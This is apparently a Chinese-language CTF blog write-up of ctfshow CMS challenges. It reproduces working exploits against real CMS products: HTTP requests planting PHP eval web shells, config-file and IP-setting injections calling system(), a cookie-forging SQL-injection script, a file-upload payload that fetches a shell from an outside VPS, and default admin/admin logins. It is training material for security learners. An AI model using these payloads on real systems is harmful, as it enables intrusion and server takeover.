---
title: ctfshow入门CMS
date: 2026-06-25T11:20:22+08:00
lastmod: 2026-06-25T11:20:22+08:00
summary: " "
url: /posts/ctfshow入门CMS/
categories:
  - ctfshow
tags:
  - CMS
draft: false
---
# web477

## \# CmsEasy 5.7后台RCE

打开发现是CmsEasy，在源代码中找一下版本号

```html
<meta name="Generator" content="CmsEasy 6 0 0 20180404 UTF8" />
```

CmsEasy6.0.0版本，找找可用的cve

https://cloud.tencent.com/developer/article/1459238

需要登陆后台，目录扫描被禁止了，默认路由是`/index.php?case=admin&act=login&admin_dir=admin&site=default`，访问一下就出来了

弱口令admin/admin登陆后台

漏洞点在/lib/table/table_templatetagwap.php

```php
<?php

class table_templatetag extends table_mode {
    function vaild() {
        if (!front::post('name')) {
            front::flash('请填写名称！');
            return false;
        }

        if (!front::post('tagcontent')) {
            front::flash('请填写内容！');
            return false;
        }

        return true;
    }

    function save_before() {
        if (!front::post('tagfrom')) {
            front::$post['tagfrom'] = 'define';
        }

        if (!front::post('attr1')) {
            front::$post['attr1'] = '0';
        }

        if (front::$post['tagcontent']) {
            front::$post['tagcontent'] = htmlspecialchars_decode(front::$post['tagcontent']);
        }
    }

}
```

save_before()函数会调用htmlspecialchars_decode()函数将 `tagcontent` 中的 HTML 实体还原为原始字符

在模板--自定义标签--添加自定义标签中打

```php
1111111111";}<?php phpinfo()?>
```

点击预览可以触发RCE，配置文件里就有flag

# web478

## \# PHPCMSv9.6.0前端SSRF导致任意文件上传漏洞

```html
- 安装路径 your-domain/install/install.php
- 数据库用户名密码都是root 地址写127.0.0.1
```

访问安装一下，发现是PHPCMS 9.6.0

[PHPCMS V9.6.0_前台任意文件上传](https://cloud.tencent.com/developer/article/2325456)

```http
POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
Host: 5cd577db-ed32-47df-b18a-48c9f27acf27.challenge.ctf.show
Cookie: PHPSESSID=83uf05po94ttiuil05428gsfk3
Content-Length: 195
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://5cd577db-ed32-47df-b18a-48c9f27acf27.challenge.ctf.show
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://5cd577db-ed32-47df-b18a-48c9f27acf27.challenge.ctf.show/index.php?m=member&c=index&a=register&siteid=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: keep-alive

siteid=1&modelid=11&username=test11&password=test11&pwdconfirm=test11&email=test11%40qq.com&nickname=test11&info[content]=<img+src=http://[Your-VPS-IP]/shell.txt?.php#.jpg>&dosubmit=1&protocol=
```

![](image/Pasted%20image%2020260720103858.png)

![](image/Pasted%20image%2020260720103915.png)

这里modelid需要手动改成11

![](image/Pasted%20image%2020260720103937.png)

# web479

## \# iCMS V7.0.1 admincp sql注入

首页底部写了版本是iCMS V7.0.1，找找已知漏洞

找到一个ICMSv7.0.1 admincp sql注入

## 漏洞分析

没有源码，只能看师傅们的代码分析了

[# ICMSv7.0.1 admincp.class.php sql注入分析](https://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/)

漏洞的地方在 app\admincp\admincp.class.php 的init函数

```php
public static function init() {
		self::check_seccode(); //验证码验证
		iUI::$dialog['title'] = iPHP_APP;
		iDB::$show_errors     = true;
		iDB::$show_trace      = false;
		iDB::$show_explain    = false;
		members::$LOGIN_PAGE  = ACP_PATH.'/template/admincp.login.php';
		members::$GATEWAY     = iPHP::PG('gateway');
		members::check_login(); //用户登陆验证
		members::check_priv('ADMINCP','page');//检查是否有后台权限
		files::init(array('userid'=> members::$userid));
		//菜单
		menu::init();
		menu::$callback = array(
			"priv" => array("members","check_priv"),
			"hkey" => members::$userid
        );
        admincp::$callback = array(
			"history" => array("menu","history"),
			"priv"    => array("members","check_priv")
        );
	}
```

查看用户校验登陆部分，跟进`members::check_login()`

```php
public static function check_login() {
//        self::$LOGIN_COUNT = (int)authcode(get_cookie('iCMS_LOGIN_COUNT'),'DECODE');
//        if(self::$LOGIN_COUNT>iCMS_LOGIN_COUNT) exit();
	 $a   = iSecurity::escapeStr($_POST['username']);
	 $p   = iSecurity::escapeStr($_POST['password']);
	 $ip  = iPHP::get_ip();
	 $sep = iPHP_AUTH_IP?'#=iCMS['.$ip.']=#':'#=iCMS=#';
	 if(empty($a) && empty($p)) {
		 $auth       = iPHP::get_cookie(self::$AUTH);
		 list($a,$p) = explode($sep,authcode($auth,'DECODE'));
		 $c = self::check($a,$p);
	 }else {
		 $p = md5($p);
		 $c = self::check($a,$p);
		 if ($c){
			 iDB::query("
				 UPDATE `#iCMS@__members`
				 SET `lastip`='".$ip."',
				 `lastlogintime`='".time()."',
				 `logintimes`=logintimes+1
				 WHERE `uid`='".self::$userid."'
			 ");
			 iPHP::set_cookie(self::$AUTH,authcode($a.$sep.$p,'ENCODE'));
		 }
	 }
	 return self::result($c);
 }
```

有两种登陆校验方式，一种是通过表单传入用户名密码登陆，一种是通过cookie校验

`$a`和`$p`分别是用户名和密码，表单获取后会经过escapeStr函数过滤处理

如果`$a`和`$p`为空则会从cookie中取值，调用`explode($sep,authcode($auth,'DECODE'))`获取到用户名和密码，并调用check进行检查

如果不为空就将密码进行一次md5，后调用check进行检查，跟进看看check的逻辑

```php
public static function check($a,$p) {

	 if(empty($a) && empty($p)) {

		 return false;

	 }

	 self::$data = iDB::row("SELECT * FROM `#iCMS@__members` WHERE `username`='{$a}' AND `password`='{$p}' AND `status`='1' LIMIT 1;");

...
```

check函数存在sql注入，但是username和password会经过escapeStr函数过滤

```php
public static function escapeStr($string) {
	if(is_array($string)) {
		foreach($string as $key => $val) {
			$string[$key] = iSecurity::escapeStr($val);
		}
	} else {
		$string = str_replace(array('%00','\\0',"\0","\x0B"), '', $string); //modified@2010-7-5
		$string = str_replace(array('&', '"',"'", '<', '>'), array('&amp;', '&quot;','&#039;', '&lt;', '&gt;'), $string);
		$string = preg_replace('/&amp;((#(\d{3,5}|x[a-fA-F0-9]{4})|[a-zA-Z][a-z0-9]{2,5});)/', '&\\1',$string);
		$string = str_replace('\\\\', '&#92;', $string);
	}
	return $string;
}
```

过滤了空白字节，特殊字符`'&', '"',"'", '<', '>'`，反斜杠；这里过滤了单双引号，不好打

看看cookie校验登陆

```php
if(empty($a) && empty($p)) {
		 $auth       = iPHP::get_cookie(self::$AUTH);
		 list($a,$p) = explode($sep,authcode($auth,'DECODE'));
		 $c = self::check($a,$p);
	 }
```

会从cookie中提取username和password，并且没有做检查，如果能构造包含恶意语句的cookie就可以注入了

但是我没有项目源码，项目里具体如何加密cookie的流程也不清楚，所以直接用工具一把梭吧

## 失败的尝试到成功绕过

https://github.com/CHYbeta/cmsPoc

![](image/Pasted%20image%2020260720103959.png)

但是一直没打通，后面看了一下脚本发现是用的默认固定密钥key

![](image/Pasted%20image%2020260720105045.png)

让ai优化一下脚本，加个参数--key用于指定密钥，这样灵活性更高
## 官方修复

官方在 v7.0.2中修复了该漏洞，在`members::check_login()`函数中，当从cookie中获取到a,p后先进行了一次addslashes，之后才进行查询。

最后参考了一位师傅的脚本

```php
<?php
//error_reporting(0);
function urlsafe_b64decode($input){
    $remainder = strlen($input) % 4;
    if ($remainder) {
        $padlen = 4 - $remainder;
        $input .= str_repeat('=', $padlen);
    }
    return base64_decode(strtr($input, '-_!', '+/%'));
}

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length   = 8;
    $key           = md5($key ? $key : iPHP_KEY);
    $keya          = md5(substr($key, 0, 16));
    $keyb          = md5(substr($key, 16, 16));
    $keyc          = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey      = $keya.md5($keya.$keyc);
    $key_length    = strlen($cryptkey);

    $string        = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result        = '';
    $box           = range(0, 255);

    $rndkey        = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i < 256; $i++) {
        $j       = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp     = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a       = ($a + 1) % 256;
        $j       = ($j + $box[$a]) % 256;
        $tmp     = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result  .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
}

echo "iCMS_iCMS_AUTH=".urlencode(authcode("'or 1=1##=iCMS[192.168.0.1]=#1","ENCODE","n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk"));
```

其实只要拿到源码就能直接复制那个加密函数用来构造了

![](image/Pasted%20image%2020260720104102.png)

# web480

## \# 配置文件写入getshell

从`config::init()`跟进

```php
public static function init(){  
    foreach ($_REQUEST['conf'] as $key => $value) {  
        config::change($key, $value);  
    }  
}
```

获取conf属组参数并调用change更改配置

```php
public static function change($k,$v){  
    $conf = self::parseFile('config.php');  
    $conf[$k] = $v;  
    self::saveValues($conf);  
}
```

先调用parseFile获取config默认配置

```php
public static function parseFile($file)  
   {  
       $options = array();  
       foreach (file($file) as $line) {  //按行读取文件内容
           $line = trim(preg_replace(array("/^.*define\([\"']/", "/[^&][#][@].*$/"), "", $line));  //移除`define('`和`define("`部分
           if ($line != "" && substr($line, 0, 2) != "<?" && substr($line, -2, 2) != "?>") {  
               $line = str_replace(array("<?php", "?>", "<?",), "", $line); //移除php标签头 
  
               $opts = preg_split("/[\"'],/", $line);  //按引号+逗号为分隔符分字符串
  
               if (count($opts) == 2) {  //如果存在两段字符串则进入逻辑
                   if (substr($opts[1], 0, 1) == '"' || substr($opts[1], 0, 1) == "'") {  //如果第二段字符串以单双引号开头
                       $opts[1] = substr($opts[1], 1, -3); //获取第二段字符串的内容（如果是引号包裹的话末尾三个字符就是类似"');"，三个字符） 
                   } else {  
                       $opts[1] = substr($opts[1], 0, -2);//如果不是字符串末尾就是`);` 
                   }  
  
                   if (substr($opts[0], -5, 5) == "_HTML") {  //如果key名是_HTML字符串常量
                       $opts[1] = eval("return " . $opts[1] . ";");  
                   }  
                   $options[$opts[0]] = str_replace("\'", "'", $opts[1]);//还原转义单引号  
               }  
           }  
       }  
       return $options;  
   }
```

然后调用saveValues函数保存配置

```php
public static function saveValues($values, $configname = '')    
   {  
       $profile = null;  
       $str = "<?php\n";  
       foreach ($values as $directive => $value) {  //遍历键值对
           $directive = trim(strtoupper($directive));  //去除首尾空格并转为大写
           if ($directive == 'CURRENTCONFIGNAME') {    
               $profile = $value;  //如果CURRENTCONFIGNAME则不写入
               continue;  
           }  
           $str .= "define(\"$directive\","; // 拼接define语句前半段 
           $value = stripslashes($value);  // 去除 $value 中的反斜杠转义
           if (substr($directive, -5, 5) == "_HTML") {  //如果是_HTML类型配置
               $value = htmlentities($value, ENT_QUOTES, LANG_CHARSET);//将 HTML 特殊字符转义为实体  
               $value = str_replace(array("\r\n", "\r", "\n"), "", $value);//移除所有换行符  
               $str .= "exponent_unhtmlentities('$value')"; //写入一个 exponent_unhtmlentities函数调用
           } elseif (is_int($value)) {  //如果是整数类型
               $str .= "'" . $value . "'";  //值存为字符串形式
           } else {  
               if ($directive != 'SESSION_TIMEOUT') {  
                   $str .= "'" . str_replace("'", "\'", $value) . "'";   
               }  
               else {  //如果是SESSION_TIMEOUT直接删除值内的单引号
                   $str .= "'" . str_replace("'", '', $value) . "'";  
               }  
           }  
           $str .= ");\n";  //拼接define语句后半段
       }  
  
       $str .= '?>';  //拼接php代码结束标签
       if ($configname == '') {  
           $str .= "\n<?php\ndefine(\"CURRENTCONFIGNAME\",\"$profile\");\n?>";   
       }  /*
       如果没指定配置文件，则在末尾追加<?php define("CURRENTCONFIGNAME","{$profile}");?>
       */
       self::writeFile($str, $configname);  
   }
```

既然是拼接的话那可以尝试打一下配置文件

关注到这句话

![](image/Pasted%20image%2020260720104118.png)

只是做了一个简单的转义，可以用反斜杠绕过

```bash
/index.php?conf[USER]=25\\');system("ls");//
```

随后访问config.php就行了

# web481

## \# copy函数+伪协议

看看附件index.php

```php
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2021-02-24 22:49:46  
# @Last Modified by:   h1xa  
# @Last Modified time: 2021-02-24 22:55:13  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
error_reporting(0);  
  
if(md5($_GET['session'])=='3e858ccd79287cfe8509f15a71b4c45d'){  
$configs="c"."o"."p"."y";  
$configs(trim($_GET['url']),$_GET['cms']);}  
  
?>  
nothing here
```

如果传入的session校验正确，就调用`copy(trim($_GET['url']),$_GET['cms'])`将远程文件下载到服务器指定路径

这个session解密后其实就是ctfshow

![](image/Pasted%20image%2020260720104127.png)

用伪协议去写入文件

```http
POST /?session=ctfshow&url=php://input&cms=./poc.php HTTP/1.1
Host: f602293e-3030-4a20-b607-4bc0a5493930.challenge.ctf.show
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ctf.show/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php @eval($_POST['cmd']);?>

```

![](image/Pasted%20image%2020260720104133.png)

# web482
## \# zzcms v8.1重装漏洞

参考：[zzcms8.1重装漏洞](https://cloud.tencent.com/developer/article/2204326)

zzcms和其他cms一样，都是通过检测lock文件来判定是否安装过，但是这里的检测不全面，仅仅只是在step进行file_exists的判定，而在其他step2,step3等都没有，所以导致存在一个重装漏洞

访问`install/index.php`进行重装，post上传`step=2`来绕过lock的检测

在安装的时候，数据库服务器需要填写成127.0.0.1，localhost不知道为啥不行

![](image/Pasted%20image%2020260720111637.png)

# web484

## \# 易优CMSv1.0.2 前台文件上传getshell

分析文章：https://hu3sky.github.io/2018/08/25/eyou%C7%B0%CC%A8getshell/

## Eyoucms版本识别

EyouCMS 把版本号写在 /data/conf/version.txt，且默认未做访问限制，可直接 GET 读取

![](image/Pasted%20image%2020260720104142.png)

所以这道题的cms版本是1.0.2

## 漏洞分析

在application\api\controller\Uploadify.php文件中的preview函数

```php
		$src = file_get_contents('php://input');//从 PHP 的输入流（`php://input`）中读取原始的 HTTP 请求体内容（即 POST 提交的原始数据），赋值给变量 `$src`
        if (preg_match("#^data:image/(\w+);base64,(.*)$#", $src, $matches)) { //使用preg_match函数进行正则表达式匹配 `$src`，先匹配`data:image/`前缀，后面有两个捕获组，`(\w+)` 捕获图片类型保存为`matches[1]`，`(.*)`捕获Base64 编码内容保存到 `$matches[2]`
            $previewUrl = sprintf(
                "%s://%s%s",//三个占位符
                isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',// 根据 `$_SERVER['HTTPS']` 是否开启决定使用 `https` 或 `http`；
                $_SERVER['HTTP_HOST'],// `$_SERVER['HTTP_HOST']`（Host头部，也就是域名或 IP）
                $_SERVER['REQUEST_URI']//`$_SERVER['REQUEST_URI']`（包含路径和查询字符串的完整 URI）
            );
            $previewUrl = str_replace("preview.php", "", $previewUrl);//过滤url中的preview.php
            $base64 = $matches[2];//Base64 数据
            $type = $matches[1];//图片类型
            if ($type === 'jpeg') {//如果是jpeg，就替换成jpg
                $type = 'jpg';
            }
        
            $filename = md5($base64).".$type";//赋值文件名
            $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;//拼接文件保存路径
        
            if (file_exists($filePath)) {//如果文件存在
                die('{"jsonrpc" : "2.0", "result" : "'.$previewUrl.'preview/'.$filename.'", "id" : "id"}');
            } else {
                $data = base64_decode($base64);//对base64进行解码
                file_put_contents($filePath, $data);//写入文件
                die('{"jsonrpc" : "2.0", "result" : "'.$previewUrl.'preview/'.$filename.'", "id" : "id"}');
            }
```

没过滤，那可以进行文件写入，其中`$matches[1]`文件类型可以写成php来进行绕过，正则匹配只检测了`data:image/`前缀而没有对后面的内容进行检测

## 最终POC

```http
POST /index.php/api/Uploadify/preview HTTP/1.1
Host: 2b3f1a23-befe-4e73-b349-11e476bea685.challenge.ctf.show
Cookie: PHPSESSID=u2n9ciutflk53bvg8b6cn0cm74
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
If-None-Match: "6036a2f1-6"
If-Modified-Since: Wed, 24 Feb 2021 19:03:13 GMT
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
```

![](image/Pasted%20image%2020260720104156.png)

访问/preview/5f38ff3c8c94a7347e0ff5b0c1fb0512.php就可以出来了

![](image/Pasted%20image%2020260720104240.png)

# web485

## \# 海洋CMS最新版后台getshell

先确定版本，拉一份最新版源码下来，发现在/data/admin/ver.txt中有版本号信息

![](image/Pasted%20image%2020260720113021.png)



找到一篇文章：https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Seacms/Seacms%20%E5%90%8E%E5%8F%B0getshell/

也就是CVE-2025-25802

```php
<?php

header('Content-Type:text/html;charset=utf-8');

require_once(dirname(__FILE__)."/config.php");

CheckPurview();

if($action=="set")

{

    $v= $_POST['v'];

    $ip = $_POST['ip'];

    $open=fopen("../data/admin/ip.php","w" );

    $str='<?php ';

    $str.='$v = "';

    $str.="$v";

    $str.='"; ';

    $str.='$ip = "';

    $str.="$ip";

    $str.='"; ';

    $str.=" ?>";

    fwrite($open,$str);

    fclose($open);

    ShowMsg("成功保存设置!","admin_ip.php");

    exit;

}

?>
```

str参数最终拼接的结果类似于：

```php
<?php $v = "用户输入的v"; $ip = "用户输入的ip"; ?>
```

既然参数是拼接且可控，那可以直接写文件

但是一直都没找到怎么进后台，访问admin目录出现

![](image/Pasted%20image%2020260720113127.png)

拉一份源码下来看看

在admin/templets/login.html中

```html
<!DOCTYPE html>
<html>
<head>
<title>后台管理中心</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="js/css/style.css" rel="stylesheet" type="text/css" />
<link href="js/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
<link rel="stylesheet" type="text/css" href="js/css/styles1.css" title="styles1" media="screen" />
<style>
.submit_btn{background: #00b7ee;}
</style>
<script src="js/jquery.js"></script>
<script src="js/styleswitch.js"></script>
<script src="js/Particleground.js"></script>
<script>
$(document).ready(function() {
  $('body').particleground({
    dotColor: 'rgba(95,184,120,0.5)',
    lineColor: 'rgba(95,184,120,0.5)'
  });
});
</script>
<style type="text/css">
  html,body{height: 100%;position: relative;background-color:#5fb878!important;background-image: linear-gradient(to right bottom, #0066CC , #5fb878)!important;}
  .admin_login{box-shadow:0 0 15px #555555;}
</style>
</head>
<body onload="javascript:document.formsearch.userid.focus();" id="canvas">
  <div class="admin_login">
    <form method="post" action="login.php" name="formsearch" id="formsearch">
	 <input type="hidden" name="gotopage" value="<?php if(!empty($gotopage)) echo $gotopage;?>" />
      	<input type="hidden" name="dopost" value="login" />
    <div class="admin_title">
       <strong>海洋<span style="color:#5FB878">CMS</span> 站点管理系统</strong>
       <em>SeA Content Management System</em>
    </div>
    <div class="admin_user">
       <input type="text" name="userid" placeholder="管理员账号" class="login_txt">
    </div>
    <div class="admin_pwd">
       <input type="password" name="pwd" placeholder="管理员密码" class="login_txt">
    </div>
	
	<?php $v=file_get_contents("../data/admin/adminvcode.txt"); ?>
    <div class="admin_val" style="<?php if($v==0) echo 'display:none;'; ?>">
       <input type="text" name="validate" placeholder="验证码" maxlength="4" class="login_txt left" style="text-transform:uppercase;">
       <div id="yzm" class="right"><img id='code_img' onClick="this.src=this.src+'?get=' + new Date()" src='../include/vdimgck.php'></div>
    </div>
	
    <div class="admin_sub">
<?php
//检测后台目录是否更名
$cdir=strtolower($cdir);
if($cdir=="/admin/login.php")
{
	echo '<font style="color: #c10f0f;font-weight: bold;font-size: 12px;">后台目录名不能是admin，请修改后重试！';
}
else
{
	echo '<input type="submit" value="立即登陆" class="submit_btn">';
}
?>
    </div>
    <div class="admin_info">
        <p style="color: #555">© SEACMS.NET</p>
    </div>
    </form>   
  </div>
</body>
</html>
```

然后我们看看admin/login.php，发现是最后才会`include('templets/login.htm');`，也就是说我们这里是可以手动发包登录的

```php
<?php 
//略

if($dopost=='login' AND $v==0)
{
		$cuserLogin = new userLogin($admindir);
		if(!empty($userid) && !empty($pwd))
		{
			$res = $cuserLogin->checkUser($userid,$pwd);

			//success
			if($res==1)
			{
				$cuserLogin->keepUser();
				$_SESSION['hashstr']=$hashstr;
				if(!empty($gotopage))
				{
					ShowMsg('成功登录，正在转向管理管理主页！',$gotopage);
					exit();
				}
				else
				{
					ShowMsg('成功登录，正在转向管理管理主页！',"index.php");
					exit();
				}
			}

			//error
			else if($res==-1)
			{
				ShowMsg('你的用户名不存在!','-1');
				exit();
			}
			else
			{
				ShowMsg('你的密码错误!','-1');
				exit();
			}
		}

		//password empty
		else
		{
			ShowMsg('用户和密码没填写完整!','-1');
				exit();
		}

}
$cdir = $_SERVER['PHP_SELF']; 
include('templets/login.htm');

?>
```

使用admin/admin登录后台

![](image/Pasted%20image%2020260720114028.png)

登录后台后漏洞就很多了，我这里选择在/admin_ip.php

```http
POST /admin/admin_ip.php?action=set HTTP/1.1
Host: 13bcc173-cbd9-4586-b6e8-dfb6c2e2a295.challenge.ctf.show
Cookie: PHPSESSID=2a7724v7vgrtn89v8q6nculv3t
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://13bcc173-cbd9-4586-b6e8-dfb6c2e2a295.challenge.ctf.show/admin/login.php?gotopage=%2Fadmin%2F
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

v=111&ip=1.1.1.1";system($_POST[1]);?>#
```

然后访问/admin/admin_ip.php传入1=命令就行了

![](image/Pasted%20image%2020260720115026.png)

# web600

源码地址：https://www.csdeshang.com/home/download/index.html

最新版是3.0版，2021年下半年发布的，而题目环境是DSCMS(20210531)，估计是2.0版本的

并且在README文件中发现

![](image/Pasted%20image%2020260720163647.png)

相比于2.0，3.0没有发布什么漏洞修复，也就是说只要审计处3.0的漏洞，那么这个漏洞同样存在于2.0版本

